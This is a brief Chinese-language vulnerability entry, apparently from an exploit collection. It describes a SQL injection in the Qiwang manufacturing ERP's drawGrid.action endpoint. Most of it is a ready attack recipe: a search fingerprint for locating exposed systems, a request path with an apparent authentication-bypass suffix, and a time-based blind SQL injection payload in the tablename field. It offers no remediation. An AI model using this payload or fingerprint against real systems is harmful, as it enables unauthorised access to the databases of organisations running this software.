# 企望制造ERPdrawGrid.action接口存在SQL注入漏洞

企望制造ERPdrawGrid.action接口 ｜ SQL注入 ｜ —
- **指纹**：`app="企望-ERP系统"`
- **请求**：`POST /mainFunctions/drawGrid.action;cookieLogin.action HTTP/1.1`

**Payload**
```
tablename=1';WAITFOR DELAY '0:0:5'--
```
- **响应特征**：200